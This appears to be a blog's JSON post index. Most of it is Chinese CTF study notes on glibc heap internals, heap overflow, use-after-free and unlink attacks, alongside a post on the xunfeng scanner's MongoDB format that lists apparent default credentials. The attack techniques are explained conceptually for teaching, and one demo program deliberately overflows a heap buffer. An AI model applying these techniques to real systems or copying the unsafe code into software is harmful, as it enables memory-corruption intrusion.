大会结束后，PPP战队在IRC频道中公开的技术非常好 14:52 (ricky) Here are most of my solutions: https://rzhou.org/~ricky/hitcon2014/ 14:53 (ricky) Curious as to what others did 14:53 (tomcr00se) i don&apos;t understand your stkof 14:54 (tomcr00se) how did you link in 0x602100 without throwing one of 10 million asserts 14:55 (ricky) I used the fastbins - the only check is that the size matches the fastbin (and the size is the index for the next entry) 14:55 (ricky) So I made enough entries to make the index correct 14:55 (ricky) Now I&apos;m really curious about how you did it","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记6:Unlink Attack 初级","slug":"Pwn学习笔记6-Unlink-Attack-初级","date":"2019-03-18T07:36:12.000Z","updated":"2019-03-18T07:36:51.308Z","comments":true,"path":"2019/03/18/Pwn学习笔记6-Unlink-Attack-初级/","link":"","permalink":"https://darkwing.moe/2019/03/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06-Unlink-Attack-%E5%88%9D%E7%BA%A7/","excerpt":"","text":"Unlink Attack什么是Unlik Attack 比较古老的一种攻击技术 之前的一些CTF比赛中出过这类题目 DEFCON CTF 2014 - Baby’s First: 1 – heap Linux x86二进制程序，之前的Doug Lea’s malloc是静态链接，可以进行简单的Unlik Attack PlaidCTF 2014 - Pwnables200 – ezhp Linux x86二进制程序，使用一个链表来自行管理分配的内存区域，可以进行Unlik Attack DEFCON CTF 2013 - Exploitation5 – yolo FreeBSD x64二进制程序，自己实现的内存管理机制，可以进行Unlik Attack 堆溢出时，如果下面是free状态的chunk，fd/bk可以被覆盖 这种情况就存在Unlink Attack的可能性 fd/bk 是什么 free区域，为了再次利用时的高速，使用了双向链表结构 这是为了快速寻找分散在各个地方的free区块 为此产生了fd/bk指针 各个chunk也存在prev_size和size变量，在图中省略了 正常的free() 假设紧接着P之前的P2是使用中状态 从P2开始，加上自身的size可以知道P的地址 如果在此状态下执行free(P2) ,那么将会产生两个连续的free区域 这将产生一个大的free块，需要从列表中暂时删除P 这是free()内部进行的unlink P2被free时，下面的P也会被unlink，这一点很重要 合并成一个大的free块(然后再次插入相应的列表) exploit的流程 在前面的内存进行堆溢出，覆盖fd 使其指向X 进行free(P2)的时候，相连接的P被unlink 此时，BK和X在链表中相连 忆往昔 DEFCON CTF 2014预选赛出过的一道题，就是利用这样的技巧 Baby’s First: 1 - heap 使用旧时代的libc，并没有太严格的限制 但是，时代变了 看今朝 2004年之后libc中的free()，无法进行这样的Unlink Attack P-&gt;fd-&gt;bk == P P-&gt;bk-&gt;fd == P 加入了这样的判断，如果不满足将产生错误 P-&gt;fd-&gt;bk = X-&gt;bk != P ，unlink之前就会产生错误","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"巡风数据库格式研究及手动导入资产","slug":"巡风数据库格式研究及手动导入资产","date":"2019-03-18T06:14:20.000Z","updated":"2019-03-18T06:31:25.812Z","comments":true,"path":"2019/03/18/巡风数据库格式研究及手动导入资产/","link":"","permalink":"https://darkwing.moe/2019/03/18/%E5%B7%A1%E9%A3%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%BC%E5%BC%8F%E7%A0%94%E7%A9%B6%E5%8F%8A%E6%89%8B%E5%8A%A8%E5%AF%BC%E5%85%A5%E8%B5%84%E4%BA%A7/","excerpt":"","text":"连接及基本信息默认安装环境下： 12345678910111213141516root@ubuntu:&#x2F;opt&#x2F;xunfeng&#x2F;xunfengdb&#x2F;bin# .&#x2F;mongo mongodb:&#x2F;&#x2F;127.0.0.1:65521&#x2F;xunfengMongoDB shell version v3.4.0connecting to: mongodb:&#x2F;&#x2F;127.0.0.1:65521&#x2F;xunfengMongoDB server version: 3.4.0&gt; db.auth(&#39;scan&#39;,&#39;scanlol66&#39;)1&gt; show collectionsConfigHeartbeatHistoryInfoPluginResultStatisticsTaskUpdate 资产相关表根据巡风代码，主要是Info表 https://github.com/ysrc/xunfeng/blob/master/nascan/lib/scan.py 123mongo.NA_INFO.insert(&#123;&quot;ip&quot;: self.ip, &quot;port&quot;: self.port,“hostname&quot;: hostname, &quot;banner&quot;: banner, &quot;time&quot;: time_&#125;) mongo.NA_INFO.update(&#123;&#39;ip&#39;: self.ip, &#39;port&#39;: self.port&#125;,&#123;&quot;$set&quot;: &#123;&#39;banner&#39;: self.banner, &#39;server&#39;: &#39;web&#39;, &#39;webinfo&#39;: web_info,&#39;time&#39;: time_&#125;&#125;) 以一条具体数据为例： 123db.Info.find()&#123; &quot;_id&quot; : ObjectId(&quot;id信息&quot;), &quot;ip&quot; : &quot;ip_address&quot;, &quot;hostname&quot; : &quot;hostname_miao&quot;, &quot;time&quot; : ISODate(&quot;2019-03-06T02:49:18.268Z&quot;), &quot;banner&quot; : &quot;banner 信息&quot;, &quot;port&quot; : 2333, &quot;webinfo&quot; : &#123; &quot;tag&quot; : [ &quot;php&quot;,&quot;apache&quot;], &quot;title&quot; : &quot;Error 404 Not Found&quot; &#125;, &quot;server&quot; : &quot;web&quot; &#125; 在巡风web界面大概是这样 ip，port，hostname，banner等顾名思义 server：web webinfo中php，apache 打码的蓝色信息为webinfo中title 可以获取下Info中的key： 123456789101112131415161718192021222324mr &#x3D; db.runCommand(&#123; &quot;mapreduce&quot; : &quot;Info&quot;, &quot;map&quot; : function() &#123; for (var key in this) &#123; emit(key, null); &#125; &#125;, &quot;reduce&quot; : function(key, stuff) &#123; return null; &#125;, &quot;out&quot;: &quot;Info&quot; + &quot;_keys&quot; &#125;)&#123; &quot;result&quot; : &quot;Info_keys&quot;, &quot;timeMillis&quot; : 112, &quot;counts&quot; : &#123; &quot;input&quot; : 1209, &quot;emit&quot; : 8707, &quot;reduce&quot; : 102, &quot;output&quot; : 8 &#125;, &quot;ok&quot; : 1&#125;&gt; db.Info_keys.distinct(&quot;_id&quot;)[ &quot;_id&quot;, &quot;banner&quot;, &quot;hostname&quot;, &quot;ip&quot;, &quot;port&quot;, &quot;server&quot;, &quot;time&quot;, &quot;webinfo&quot;] 可以看到主要就这些信息 因此如果认为巡风自身资产探测不完善，需要手工导入资产信息，既可以按照这种格式构造数据进行导入","categories":[],"tags":[]},{"title":"Pwn学习笔记5:堆溢出与User After Free","slug":"Pwn学习笔记5-堆溢出与User-After-Free","date":"2019-03-15T06:29:34.000Z","updated":"2019-03-15T06:30:21.298Z","comments":true,"path":"2019/03/15/Pwn学习笔记5-堆溢出与User-After-Free/","link":"","permalink":"https://darkwing.moe/2019/03/15/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%8EUser-After-Free/","excerpt":"","text":"堆溢出 原理非常简单 数据溢出并覆盖下一个区域 如果下面有认证信息或重要数据，则可以破坏/覆盖 如果溢出目标是函数指针，则可以进行pwn func_ptr overwrite 当函数被调用时，则变成了调用system 如果下面是free chunk，则管理数据会被破坏 heap管理变得奇怪的话，进程可能会crash 以之前的例子1进行尝试 正常运行是上面这样的 过长数据破坏heap管理区域是下面这样的 12345$ .&#x2F;a.out TESTTESTTESTTESTTESTTEST TESTTESTTESTTESTTESTTEST$ .&#x2F;a.out TESTTESTTESTTESTTESTTESTTEST TESTTESTTESTTESTTESTTESTTEST*** Error in &#96;.&#x2F;a.out&#39;: free(): invalid next size (fast): 0x00000000006de010 ***Aborted (core dumped) Use After Free 顾名思义，heap内存释放后再次使用 假设用户已经通过new获取了可以读取写入的内存 假设已进行delete ptr操作 这时候，原本的ptr已经不能使用 但是，由于Use After Free问题，仍然可以直接读取和写入此地址 假设通过new获取了ptr2 它恰好和之前的ptr指向同一个地方，需要考虑到这种情况 堆释放后可能被再次利用，就是因为这个 如果ptr2是object，它通常有一个虚函数表 指向这个虚函数表的的指针叫做vptr 因为ptr可能还会使用，从ptr进行覆盖可能会改变vptr vptr overwrite vptr指向可控区域，并将内容设置为system地址等 这样当调用函数时，实际调用的是system Use After Free很难找到 阅读大部分代码，如果不了解整体行为，通常无法找到它 通常，对应的malloc和free可能跨越多个函数，需要准确掌握具体的调用位置 另外，你必须找出Use After Free的调用顺序 重点关注使用malloc/free或者new/delete较多的的二进制 这样的二进制文件就很可疑 用户输入可以自由创建object 笔记管理类 购物车系统 自己实现的内存管理机制 这种也是可能的 func_ptr overwrite + ROP 预先将ROP等加载到stack上的变量中(前提是能够加载) 通过Use After Free，在vptr之前，写入pop×N; ret之类的代码 当调用该函数时，pop×N去除其他的参数，之后触发ROP","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记4:heap布局","slug":"Pwn学习笔记4-heap布局","date":"2019-03-14T07:02:59.000Z","updated":"2019-03-14T07:03:32.606Z","comments":true,"path":"2019/03/14/Pwn学习笔记4-heap布局/","link":"","permalink":"https://darkwing.moe/2019/03/14/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-heap%E5%B8%83%E5%B1%80/","excerpt":"","text":"heap布局 使用中和free区域混杂在一起 各个block被称为chunk 想要再次使用free状态的区域 需要知道哪里有free的区域，因此它是链表结构 实际上没这么简单 malloc获得的是这个地址 size按照8的倍数进行padding 为简单起见，图中省略了fd_nextsize和bk_nextsize 实际上的结构体：123456789struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; &#x2F;* Size of previous chunk (if free). *&#x2F; INTERNAL_SIZE_T mchunk_size; &#x2F;* Size in bytes, including overhead. *&#x2F; struct malloc_chunk* fd; &#x2F;* double links -- used only if free. *&#x2F; struct malloc_chunk* bk; &#x2F;* Only used for large blocks: pointer to next larger size. *&#x2F; struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F; struct malloc_chunk* bk_nextsize;&#125;; 来源：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk 填充 仅在前一个chunk已经free时才能访问 末尾3个字节有特定的用途 最低一位(PREV_INUSE) 前一个chunk是否已被使用 低二位(IS_MMAPED) 是否是mmap获取的地址(大的内存通过mmap获取) 低三位(IS_NON_MAINARENA) 是否来自main_arena(多线程时，使用多个arena进行heap管理)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记3:heap","slug":"Pwn学习笔记3-heap","date":"2019-03-14T06:32:44.000Z","updated":"2019-03-14T06:33:38.313Z","comments":true,"path":"2019/03/14/Pwn学习笔记3-heap/","link":"","permalink":"https://darkwing.moe/2019/03/14/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-heap/","excerpt":"","text":"heap为什么提到堆： stack exploit类型的题目在很多CTF中都出现过 writeup简单学习下就能够理解 网络上也有很多相关资料 很少有CTF队伍主攻heap 主攻pwn的队伍都很少 通常这类问题分值较高 这是必须加强的部分 什么是堆 调用malloc()或者 new()时使用的是heap区域 heap区域中，”使用中”和”已free”的内存状态大不相同 详情可以通过小崎老师发布的malloc视频来了解 https://www.youtube.com/watch?v=0-vWT-t0UHg http://www.slideshare.net/kosaki55tea/glibc-malloc 视频大概两个小时，强烈建议看一次 使用heap的程序例子11234567891011#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt;int main(int argc, char* argv[])&#123; char* ptr; ptr &#x3D; (char*)malloc(20); strcpy(ptr, argv[1]); printf(&quot;%s\\n&quot;, ptr); free(ptr); return 0; &#125; 分配20字节内存 字符串拷贝 显示拷贝内容 释放 实际运行大概像这样： 123$ gcc heap1.c$ .&#x2F;a.out miaomiaomiaomiao 使用heap的程序例子2123456789#include &lt;iostream&gt; int main(void)&#123; int *p; p &#x3D; new int(); std::cin &gt;&gt; *p; std::cout &lt;&lt; *p &lt;&lt; std::endl; delete p; return 0;&#125; 分配int变量内存 读取值 显示值 释放 实际运行大概像这样： 1234$ g++ heap2.cpp$ .&#x2F;a.out66 malloc和new是从哪里获取内存的？答案是heap 从以下区域分配内存 不使用时使用free()进行释放 如果malloc次数过多，heap自身会因为不足而扩张(sbrk) 太大的内存请求将通过另一种方式分配(mmap) sbrk/mmap在malloc内部自动进行 编写程序时并不需要非常在意heap机制 只需要用了malloc() 后记得最终free()即可 使用错误会产生漏洞 需要了解细节的是 malloc/free是glibc提供的，直接去看源码是最好的学习方法","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Arena对齐及总结","slug":"Arena对齐及总结","date":"2019-03-11T08:32:41.000Z","updated":"2019-03-11T08:34:26.922Z","comments":true,"path":"2019/03/11/Arena对齐及总结/","link":"","permalink":"https://darkwing.moe/2019/03/11/Arena%E5%AF%B9%E9%BD%90%E5%8F%8A%E6%80%BB%E7%BB%93/","excerpt":"","text":"Arena 1M对齐方法图解 想要的是这样的内存 但通过mmap做不到这一点 2倍size的mmap 但是PROT_NONE RWX权限都没有，这已经不能算内存分配了，可以叫做地址空间 1M对齐的场所中，通过remap对size 1M进行RWX权限分配 剩余的空间进行munmap 总结 小型malloc如果经常出现的话，复杂度是O(n)，太糟了 防止碎片化，Huge Block将heap分开是有效的 要提高缓存命中率，引用局部性非常重要 每个线程的数据结构是每个CPU的数据结构的良好近似值 glibc malloc的缺点 由于Huge Block是绝对页对齐的，缓存很容易出现竞争(在HPC领域中通常关闭此机制) 如果是用另一种方式，将不会锁定Arena自身(这就是产生问题的heavy allocation，应用作heap自身管理，很难看到效果) 最新的dlmalloc对large bin的管理已经从列表变成了二叉树来提高速度(尽管利用率太低，效果很微妙) 最终 glibc malloc是今天的主要内容，针对int_malloc各个方面将近90页的PPT阅读不容易 源代码中的注释我觉得是在骗我，阅读用了差不多一小时 函数划分用了有两小时 构造体类型与内存上的数据结构对应用三小时 这样看起来Linux 内核还是很容易读的嘛","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"arena生成","slug":"arena生成","date":"2019-03-07T07:10:32.000Z","updated":"2019-03-07T07:11:24.081Z","comments":true,"path":"2019/03/07/arena生成/","link":"","permalink":"https://darkwing.moe/2019/03/07/arena%E7%94%9F%E6%88%90/","excerpt":"","text":"坏主意1从TLS获得arena 在获得自身专用的arena之前，有一部分是需要从main_arena中获取的，并且它必须返回给main_arena 坏主意2在每个malloc header中添加一个指向arena的指针 自寻死路，很多份4个字节 坏主意3从main_arena(唯一的全局变量)中延伸出arena的列表 检索复杂度是O(n) 结论？ arena是固定内存1M对齐，谈后，我们需要ptr &amp; ~0xFFFFF来获得指向arena的指针 课题1main_arena只是一个全局变量 每次都是熟悉的size 课题2Linux中并没有确保1M对齐的内存系统调用 可以通过以下棘手的方式完成","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Arena与多线程","slug":"Arena与多线程","date":"2019-03-05T06:33:48.000Z","updated":"2019-03-05T06:34:30.638Z","comments":true,"path":"2019/03/05/Arena与多线程/","link":"","permalink":"https://darkwing.moe/2019/03/05/Arena%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"Arena生成 main_arena == 之前说明过的heap Arena生成thread2 thread2被锁定 别的thread如果同时调用malloc，会因为锁(mutex_trylock)而失败 内存中arena结构体(包含bin数组的结构体) 新的自身专用heap通过mmap生成 这个altanative heap的构造被称为arena 记住TLS(thread local strage) 中自慎用arena，除非开辟新thread或者用尽1M内存，否则不要在此触碰它 Arena生成thread3 下一个thread也一样，继续使用main_arena，直到发生锁竞争 如果锁命中。。。 arena list，如果出现所有的锁都取得失败的情况，那么将创建一个新的专用arena thread不会突然创建arena 这是为了避免结束时专用arena被浪费 这样的结果，thread生成后会在各种arena中发生锁竞争 并且，收束到一个thread，一个arena中 1个thread，一个arena的隐藏优点 SMP机器中，从另一个CPU访问的内存不会占用自身CPU的缓存，因此如果只是简单管理上次访问，则不太方便 但是，从用户空间来看，你并不知道运行的是哪个CPU（它会自行改变） 因此，要注意内核线程的CPU亲和性调度，自身CPU访问自身线程数据的概率更高 线程专用内存=缓存命中率大幅UP 顺便说一下free的时候，如法确定自己的所属arena？","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"多线程lock问题","slug":"多线程lock问题","date":"2019-03-04T07:02:45.000Z","updated":"2019-03-04T07:03:15.308Z","comments":true,"path":"2019/03/04/多线程lock问题/","link":"","permalink":"https://darkwing.moe/2019/03/04/%E5%A4%9A%E7%BA%BF%E7%A8%8Block%E9%97%AE%E9%A2%98/","excerpt":"","text":"古典lock 很简单的，使用互斥锁来保护整个函数 实际想要这样 没有锁的简单世界 多线程 这确实是不可能的 没有办法事先知道应用创建了多少个线程 没有办法事先知道一个线程将使用多少内存 如果ITRON(Industrial the Real-Time Operation System Nucleus，工业实时操作系统中心)之类的都在编译时决定。。。 因此，我们将在运行时创建一个新的heap，如下所示","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"延迟合并","slug":"延迟合并","date":"2019-03-04T06:48:17.000Z","updated":"2019-03-04T06:48:44.588Z","comments":true,"path":"2019/03/04/延迟合并/","link":"","permalink":"https://darkwing.moe/2019/03/04/%E5%BB%B6%E8%BF%9F%E5%90%88%E5%B9%B6/","excerpt":"","text":"回顾K&amp;R free 现在free list head指向释放掉的节点 缓存和本地引用 对heap内存访问概率最高的是在malloc之后立即free 刚刚free的内存在缓存上的概率很高 为了优先确保内存，malloc之后直接访问，不会出现缓存miss 缓存命中率很重要 缓冲区的延迟合并 当调用free时，立即 与相邻空间合并，并且暂时不会进行连接到free list的处理 最初实现这种方式的是SVR4(相当早的UNIX内核) malloc-free-malloc-free这类常见的访问模式导致内存块的分离-合并-分离-合并之类的不必要处理，延迟合并能够避免这种情况。 并且，由于按照时间顺序对free进行连接，因此将列表头部的block返回到应用程序可以提高缓存命中率。 glibc malloc的最低确保单位是32，bin[0]和bin[1]不能使用 bin[1]用来存放这个延迟的block所要连接的list的header 源码中叫做unsorted_chunk，不进行排序，而是按照时间顺序 通过遍历列表，找到与要求size一致的 与要求size不一致的，在这个时间，与相邻空间合并后进行实际的free处理 从宏观角度 malloc的调用模式大致上是以下流程 应用启动时会调用malloc，很少调用free 之后，进入malloc和free大体上交错被调用的正常状态 像GUI画面切换之类的，会触发，free被单独调用，之后malloc被调用，数据结构体也会有大的变化 之后再次进入正常状态 malloc的正常状态和突发状态 延迟合并有时会事与愿违，但可以接受，因为它在正常状态下是高速化的 还有一点每个人都喜欢多线程","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"mmap","slug":"mmap","date":"2019-02-28T07:15:22.000Z","updated":"2019-02-28T07:16:02.964Z","comments":true,"path":"2019/02/28/mmap/","link":"","permalink":"https://darkwing.moe/2019/02/28/mmap/","excerpt":"","text":"什么是匿名mmap？ mmap最初是一个将文件映射到内存中的系统调用 但是，如果将”/dev/zero”作为fd参数传递，它可以用作内存预留API 使用此API，mmap可以直接从kernel中获取Huge Block(默认情况下超过128k字节)，而不是从heap获取 再次回顾一下size的低位bit 低位第二个bit是IS_MMAPED标志位 另一个标志位如果是ON，那么将不是从free list获取而是通过MMAP。free的时候也不会连接到free list，而是使用munmap(). 数据构造图解 不存在free状态的huge，因为它在释放的同时返回到操作系统 这种方式的优点 Huge Block的malloc，free都是O(1) 不容易产生碎片空间(因为它不需要管理列表) 内存浪费少(由于以相同size再次进行malloc的概率很小，因此立即将其返回给操作系统是一个明智的策略) 目前已有的结果变好的地方： malloc是典型的O(1) free是典型的O(1) 碎片现在很难出现 header size实际上是4bit 当发生brk时，K&amp;R malloc需要对freelist进行一次遍历，这种方式只需要找到比要求的size大的bin，平均探索花费是1/2 变差的地方： ？？？ 即便如此实际上还是输给了K&amp;R malloc 因为实际上，large size block的malloc-&gt;free-&gt;malloc的重复操作很慢","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"small bin与large bin","slug":"small-bin与large-bin","date":"2019-02-28T05:33:03.000Z","updated":"2019-02-28T05:34:58.418Z","comments":true,"path":"2019/02/28/small-bin与large-bin/","link":"","permalink":"https://darkwing.moe/2019/02/28/small-bin%E4%B8%8Elarge-bin/","excerpt":"","text":"small bin 结构体大体上适合这个size，并不是best fit，只是just fit 分配器 进一步改进 不处理512字节之上的部分 但是，对于较大的size也用这种8bit单位的bin是不现实的 但是可以用多个列表，这个想法还不错 large bin 单位是64bit 随着bin index增大，有必要将block size指数增大 由于有许多较小的size，有必要采取平均到各个列表的措施 但是 无论怎么做，最后一个bin都会是完全连接 处理图像之类的时候，正常都会产生几十MB的malloc 如果额外准备另一个heap，就可以分离出来更大的内存 这就是mmap","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"header的约束","slug":"header的约束","date":"2019-02-25T07:17:51.000Z","updated":"2019-02-25T07:18:28.348Z","comments":true,"path":"2019/02/25/header的约束/","link":"","permalink":"https://darkwing.moe/2019/02/25/header%E7%9A%84%E7%BA%A6%E6%9D%9F/","excerpt":"","text":"header需要必要的约束 首先，分配的内存块不需要free list的指针，bk，fd等 可以简单的删除它 需要注意访问方法 当我们转向malloc_chunk结构体来访问它时，可以看到存在fd，bk，实际上它们已经被用户应用所使用，如果访问会造成内存破坏 很难从源代码中读取 约束继续进行 经常要考虑的 prev_size在free时候的合并处理是必要的 只有当prev处于free状态时，是必要的 只有在prev处于free状态时才记录prev_size 那么，如何确认prev是否是free状态(先有鸡还是先有蛋的问题) 32位系统的指针 最低2位固定是0 glibc malloc实际上内部会取8的倍数，因此最低3位是0 size记录两个指针之间的差，当然，最低3位同样是0 也就是说 size的最低一位用于记录prev的使用状态 结构体类型和内存中的数据结构不一致，这是为什么难以读区的原因 在时间序列中 显然，从malloc header直接访问malloc chunk会出错，因为fd，bk被用户应用所使用 free的时候会第一次写入fd，bk，prev_size prev_in_use flag是1 size之外，malloc时不会确保，但它是free的，可以直接使用 源上的内存破坏很多 可以进行约束了吗 从某种意义上来说，今天的代码阅读是最难的一部分(其他部分是可读性很好的C语言) 接下来是最大的课题。malloc是典型的O(n),来解决这个问题吧 这里有一点主意 在free list中，不需要讲所有的列表都连接起来 size是固定8的倍数 best fit应当是O(1)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"K&R malloc","slug":"K-R-malloc","date":"2019-02-25T06:11:43.000Z","updated":"2019-02-25T06:16:35.020Z","comments":true,"path":"2019/02/25/K-R-malloc/","link":"","permalink":"https://darkwing.moe/2019/02/25/K-R-malloc/","excerpt":"","text":"K&amp;R malloc的优点 简单 代码大小很小(malloc仍然内置等) 除非有大量碎片空间，否则malloc是O(1) 复杂度 适用于小程序，整个程序中只使用几十次malloc K&amp;R malloc的缺点 当小型malloc频繁出现时，会出现大量碎片空间 free是O(n)复杂度 在调用brk时，需要遍历freelist一次(如果有数万个列表，缓存、刷新、代码状态将是很恐怖的) 当碎片空间增加，内存效率也急速恶化 时代变了 现在的编程语言 GUI 脚本语言或者Java C++程序语言 等等 只重复一个小型的malloc 最大的问题是什么 在这里，首先假定碎片是最大的问题 如果能够解决碎片问题 内存使用效率UP 内存使用量较少，缓存效率UP 看起来很酷 现在需要best fit 分配器，根据just Idea来实现它停止使用地址顺序，尝试使用size顺序进行排序 free的时候，不可能和相邻节点合并 就会产生额外的碎片空间 毕竟我们需要将新增成员增加到malloc header里 地址空间的prev，next不是用指针保持的，而是用size 发生了什么变化 哪里变好了 free从典型的O(n) 变成了O(1) 碎片造成的空间浪费减少了 哪里变得更糟糕 malloc从O(1)变成了O(n) header size增加，空间效率降低 这可不行，接下来进入正题","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"堆扩展及brk","slug":"堆扩展及brk","date":"2019-02-22T07:37:07.000Z","updated":"2019-02-22T07:37:44.656Z","comments":true,"path":"2019/02/22/堆扩展及brk/","link":"","permalink":"https://darkwing.moe/2019/02/22/%E5%A0%86%E6%89%A9%E5%B1%95%E5%8F%8Abrk/","excerpt":"","text":"堆扩展 因为堆并不是无限的，有时会出现空间不足的情况 这时候，我们会使用brk系统调用来扩展heap区域，brk是一个用来更改heap结尾地址的API 增加的区域分成两部分，前面一部分返回给用户，剩下的追加到free list中 简单的brk实现 data段包括静态数据和stack 当前大小以及增量（内核中）malloc 复制到新内存中 对旧的数据进行mfree stack复制到内存末尾 stack和静态数据之间的数据清零 也就是说 内核brk很慢 为了尽量少的调用brk，用户空间存在一种”尽量少使用brk，一次性获取足够需求”的方针 这被实现为一种价值观 那么： 实际上，现代Linux中brk已经变得很快速。但是暂时先不考虑这个。 现在我们以brk很慢为前提，来考虑如何提高malloc的速度","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"malloc及free算法","slug":"malloc及free算法","date":"2019-02-22T06:32:00.000Z","updated":"2019-02-22T06:32:39.950Z","comments":true,"path":"2019/02/22/malloc及free算法/","link":"","permalink":"https://darkwing.moe/2019/02/22/malloc%E5%8F%8Afree%E7%AE%97%E6%B3%95/","excerpt":"","text":"Linux中进程地址空间模型 古典的malloc 使用free list来管理空闲内存 整个进程只使用一个heap 使用malloc的时候，管理区域会使用多个allocate，并且将头部追加到管理区域（如果某个地方没有管理区域，那么在free的时候将不知道需要释放的size） 分配策略是first fit malloc的算法 首先，从列表头获取头指针 检查可用空间是否足够 指针前进到列表的下一个节点 检查可用空间是否足够 再次将指针前进到列表的下一个节点 再次，检查可用空间 此时，满足条件 将空闲区域分成两部分 更新list head 此时first list的head： 最终搜索失败的地方（分配内存的前一个节点） 实际情况 实际上会寻找一个更合适的区域 free的算法 从free list head获取第一个指针 获取第一个节点的下一个指针(next = p-&gt;s.ptr) 由于p&lt;bp&lt;next 不成立，进入下一步 p前进到下一个节点 获取下一个指针 p&lt;bp&lt;next成立 p和bp不相邻( p + p-&gt;size != bp) 因为bp和p-&gt;s.ptr相邻(bp + bp-&gt;s.size == next)，合并 free list head现在指向释放掉的节点","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记2:内存布局","slug":"Pwn学习笔记2-内存布局","date":"2019-02-21T07:19:12.000Z","updated":"2019-02-21T07:20:32.817Z","comments":true,"path":"2019/02/21/Pwn学习笔记2-内存布局/","link":"","permalink":"https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/","excerpt":"","text":"0x01 内存布局大部分Linux： .text 汇编代码 .data 有初始值的数据 .bss 无初始值的数据 heap 堆 shared object 共享对象区域(libc.so之类的) stack 栈 kernel-area 内核区域 实际数值大概像这样： gdb-peda/pwndbg 下可以直接使用vmmap 也可以通过cat /proc/$PID/maps 每行有各种属性（Read,Write,eXec） p是private mapping，变更不会反映在文件上 